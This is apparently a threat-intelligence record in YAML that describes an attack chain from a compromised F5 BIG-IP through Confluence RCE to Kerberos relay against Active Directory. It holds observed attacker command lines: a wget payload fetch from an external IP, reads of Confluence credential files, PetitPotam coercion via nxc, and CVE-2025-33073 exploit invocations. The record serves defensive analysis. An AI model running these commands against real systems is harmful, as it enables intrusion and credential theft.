title: 'Edge Appliance to SaaS to Active Directory: Multi-Domain Attack Chain via
  F5 BIG-IP and Confluence RCE'
description: A threat actor compromised an end-of-life F5 BIG-IP appliance to gain
  SSH access to an internal Linux host, then pivoted to an unpatched Atlassian Confluence
  server via RCE, harvested credentials, and conducted Kerberos relay attacks against
  Active Directory using CVE-2025-33073.
attribution: ''
malware_families:
- HackTool:Linux/MalPack.B
- HackTool:Linux/Kerbrute!rfn
cves:
- CVE-2025-33073
- CVE-2025-53521
- CVE-2025-20333
- CVE-2025-20362
- CVE-2024-2012
- CVE-2024-9474
ttps:
  processes:
  - wget
  - curl
  - nmap
  - gowitness
  - enum4linux
  - netexec
  - smbclient
  - rpcclient
  - ldapsearch
  - kerbrute
  - nxc
  - responder
  - testssl
  - java
  - cat
  - python3
  command_lines:
  - gowitness scan nmap -f $i --write-db --write-screenshots --screenshot-path ./screenshots
    --screenshot-fullpage --open-only --service-contains http --delay 5 --threads
    1 --chrome-proxy socks5://127.0.0.1:9090
  - wget http://206.189.27[.]39:8888/5
  - curl -o /dev/shm/ag ftp://anonymous:anonymous@[REDACTED_LOCAL_IP]/5
  - nxc smb [REDACTED_IP] -d [REDACTED_DOMAIN].com -u Jiraservices -p '********* -M
    coerce_plus -o M=PetitPotam L="localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA"
  - python3 CVE-2025-33073.py -u [REDACTED_DOMAIN].com\Jiraservices -p ******** --attacker-ip
    [REDACTED_IP] --dns-ip [REDACTED_IP] --dc-fqdn [REDACTED_HOSTNAME].[REDACTED_DOMAIN].com
    --target [REDACTED_HOST] --target-ip [REDACTED_IP]
  - python3 dnstool.py -u [REDACTED_DOMAIN].com\Jiraservices -p ******** [REDACTED_HOST].[REDACTED_DOMAIN].com
    -a add -r localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d [REDACTED_IP]
    -dns-ip [REDACTED_IP]
  powershell: []
  scripts:
  - Shell script to automate network scanning using Nmap
  registry_keys: []
  image_loads: []
  network_connections:
  - wget -> 206.189.27[.]39:8888
  file_activity:
  - /opt/atlassian/confluence/conf/server.xml
  - /var/atlassian/application-data/confluence/confluence.cfg.xml
  - /dev/shm/ag
  - /dev/shm/
  - /tmp/
  persistence:
  - Server Software Component (T1505) via Confluence server
  - Web shell deployed for persistent access to Confluence web server (T1505)
  - Valid domain accounts used for subsequent attacks after compromise of Confluence
    server (T1078.002)
  process_relations:
  - java -> cat server.xml
  - java -> cat confluence.cfg.xml
  - java -> curl -o /dev/shm/
  - java -> curl -o /tmp/
